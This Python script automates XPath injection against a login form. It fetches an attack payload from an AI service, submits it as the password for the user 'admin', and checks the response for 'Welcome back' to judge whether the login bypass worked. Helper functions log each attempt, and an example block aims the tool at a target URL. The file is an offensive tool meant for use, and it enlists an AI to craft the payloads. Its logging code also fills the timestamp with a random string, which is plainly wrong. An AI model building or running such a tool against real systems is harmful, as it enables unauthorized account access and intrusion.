import requests
from lxml import etree
from utils.constants import USER_ACTIVITY_LOGS, INJECTION_VECTORS
from utils.helpers import log_activity, generate_random_string
from ai_integration import query_ai_for_payload

# Function to perform XPath Injection
def xpath_injection(target_url, injection_point, api_key):
    # Query AI for the most effective payload
    payload = query_ai_for_payload(api_key, 'xpath_injection')

    # If no specific injection point is provided, assume it's a login form
    if not injection_point:
        injection_point = {'username': 'admin', 'password': payload}

    # Inject the payload
    response = requests.post(target_url, data=injection_point)

    # Log the activity
    log_activity(USER_ACTIVITY_LOGS, f"Attempted XPath Injection on {target_url} with payload: {payload}")

    # Check if the injection was successful
    if "Welcome back" in response.text:
        log_activity(USER_ACTIVITY_LOGS, f"Successful XPath Injection on {target_url}")
        return True
    else:
        log_activity(USER_ACTIVITY_LOGS, f"Failed XPath Injection on {target_url}")
        return False

# Function to parse and extract information using XPath
def extract_data_via_xpath(response_content, xpath_query):
    tree = etree.HTML(response_content)
    return tree.xpath(xpath_query)

# Function to log XPath Injection attempts
def log_xpath_injection_attempt(target_url, success, payload):
    log_entry = {
        'target_url': target_url,
        'success': success,
        'payload': payload,
        'timestamp': generate_random_string()
    }
    log_activity(INJECTION_VECTORS, log_entry)

# Example usage
if __name__ == "__main__":
    target_url = 'http://example.com/login'
    api_key = 'YOUR_API_KEY_HERE'
    success = xpath_injection(target_url, {}, api_key)
    print(f"XPath Injection {'succeeded' if success else 'failed'} on {target_url}")